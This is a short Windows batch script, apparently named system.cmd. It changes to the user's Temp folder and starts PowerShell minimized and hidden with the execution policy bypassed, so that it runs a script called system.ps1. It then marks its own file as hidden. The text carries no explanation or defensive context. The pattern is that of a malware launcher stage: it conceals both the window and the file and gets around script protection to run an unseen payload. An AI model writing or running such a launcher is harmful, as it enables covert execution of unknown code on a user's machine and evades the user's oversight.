@echo off

set initial=%cd%
cd C:\Users\%username%\AppData\Local\Temp
start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\system.ps1
cd %initial%
attrib +h %initial%\system.cmd





